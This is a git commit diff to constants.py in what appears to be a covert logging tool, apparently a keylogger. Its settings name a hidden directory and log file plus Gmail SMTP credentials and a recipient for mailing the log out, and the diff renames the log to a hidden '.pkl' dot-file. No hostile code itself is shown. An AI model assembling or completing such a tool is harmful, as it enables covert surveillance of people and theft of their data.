0180e8cf655b15f52af504a0622cdb5fa3e29958
Trọng Đại Nguyễn <brfox2k6@gmail.com>
2023-01-01 00:13:38 +0700

    Update constants.py

--- constants.py
+++ constants.py
@@ -1,7 +1,7 @@
 # TODO: Initialize the directory where you store the log file,
 # Gmail address and smtp password of the sender and Gmail address of recipient
 HIDE_DIR =  "./"        # Directory that you want to store the log file
-LOG_FILE = ""           # Name of log file, example, `log.txt`
+LOG_FILE = ".pkl"       # Name of log file, example, `log.pkl`
 SENDER = ""             # Gmail address of the sender, example, `sender@gmail.com`
 SMTP_PASSWORD = ""      # SMTP password for the sender account. If you don't know what's SMTP password, Google is your friend :)
 RECIPIENT = ""          # Gmail address of the recipient, example `recipient@gmail.com`
